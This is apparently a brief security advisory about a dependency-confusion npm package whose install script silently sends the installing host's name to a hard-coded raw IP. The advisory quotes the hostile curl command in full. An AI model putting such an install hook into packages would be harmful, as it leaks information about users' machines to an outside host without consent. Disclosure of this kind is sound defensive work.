details: Malicious package. Dependency-confusion style package using a company-named scope. The install script runs `node index.js && curl http://52.56.233.136:11111/?linux=`hostname``, falling back to `?windows=%COMPUTERNAME%`, sending the installing host's name to a raw IP. Observed in a sandboxed install, which connected to 52.56.233.136. The package has since been removed from the npm registry.
